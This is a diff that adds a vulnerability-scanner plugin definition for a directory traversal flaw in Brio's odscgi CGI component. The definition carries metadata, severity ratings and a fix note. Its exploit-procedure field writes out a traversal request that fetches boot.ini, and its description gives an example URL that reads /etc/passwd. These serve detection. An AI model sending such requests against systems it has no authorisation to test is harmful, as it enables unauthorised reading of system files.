@@ -1,0 +1,36 @@
+<plugin_id>337</plugin_id>
+<plugin_name>Brio Windows odscgi directory traversal</plugin_name>
+<plugin_family>CGI</plugin_family>
+<plugin_created_date>2005/01/09</plugin_created_date>
+<plugin_created_name>Marc Ruef</plugin_created_name>
+<plugin_created_email>marc.ruef at computec.ch</plugin_created_email>
+<plugin_created_web>http://www.computec.ch</plugin_created_web>
+<plugin_created_company>computec.ch</plugin_created_company>
+<plugin_version>1.0</plugin_version>
+<plugin_protocol>tcp</plugin_protocol>
+<plugin_port>80</plugin_port>
+<plugin_procedure_exploit>open|send GET /ods-cgi/odscgi?HTMLFile=../../../../../../../../../../../../../../../boot.ini HTTP/1.0\n\n|sleep|close|pattern_exists HTTP/#.# 200 *[operating systems]*</plugin_procedure_exploit>
+<plugin_exploit_accuracy>98</plugin_exploit_accuracy>
+<plugin_comment>The NASL script is Copyright (C) 2003 Chris Foster</plugin_comment>
+<bug_produced_name>Brio</bug_produced_name>
+<bug_produced_web>http://www.brio.com</bug_produced_web>
+<bug_affected>Brio</bug_affected>
+<bug_vulnerability_class>Directory Traversal</bug_vulnerability_class>
+<bug_description>Brio a popular web application interface has a directory traversal in the component 'odscgi'. An attacker may exploit this flaw to read  arbitrary files on the remote host by submitting a URL like: http://www.example.com/ods-cgi/odscgi?HTMLFile=../../../../../../etc/passwd</bug_description>
+<bug_solution>Check www.brio.com for updated software.</bug_solution>
+<bug_fixing_time>Approx. 1 hour</bug_fixing_time>
+<bug_exploit_availability>Yes</bug_exploit_availability>
+<bug_remote>Yes</bug_remote>
+<bug_local>Yes</bug_local>
+<bug_severity>High</bug_severity>
+<bug_popularity>3</bug_popularity>
+<bug_simplicity>8</bug_simplicity>
+<bug_impact>8</bug_impact>
+<bug_risk>6</bug_risk>
+<bug_nessus_risk>Medium</bug_nessus_risk>
+<bug_check_tool>Nessus can check this flaw with the plugin 15849 (Brio Unix Directory Traversal).</bug_check_tool>
+<source_nessus_id>15849</source_nessus_id>
+<source_literature>Hacking Exposed: Network Security Secrets & Solutions, Stuart McClure, Joel Scambray and George Kurtz, February 25, 2003, 4th Edition, McGraw-Hill Osborne Media, ISBN 0072227427</source_literature>
+<source_misc>http://www.computec.ch</source_misc>
+
+
